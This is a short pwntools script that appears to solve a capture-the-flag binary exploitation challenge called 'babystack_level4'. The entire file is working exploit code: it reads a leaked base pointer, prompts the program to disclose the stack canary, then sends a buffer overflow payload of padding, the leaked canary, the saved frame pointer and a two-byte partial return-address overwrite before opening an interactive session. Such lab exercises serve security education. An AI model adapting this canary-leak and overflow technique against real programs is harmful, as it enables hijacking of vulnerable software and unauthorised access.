from pwn import *

r = process("/challenge/babystack_level4")

r.recvuntil(b'base pointer rbp: ')
bp = int(r.recvline(keepends=False), 16)

canary_reg = hex(bp - 8)
r.recvuntil(b'(hex format)')
r.sendline(canary_reg)
print(canary_reg)

r.recvuntil(b'is: ')
leaked_canary = int(r.recvline(keepends=False), 16)
print(hex(leaked_canary))

r.recvuntil(b'will be stored: ')
buff = int(r.recvline(keepends=False), 16)

padding = cyclic(bp - buff - 8)
input = padding + p64(leaked_canary) + p64(bp) + p16(0xa330)

r.send(input)
r.recv()
r.interactive()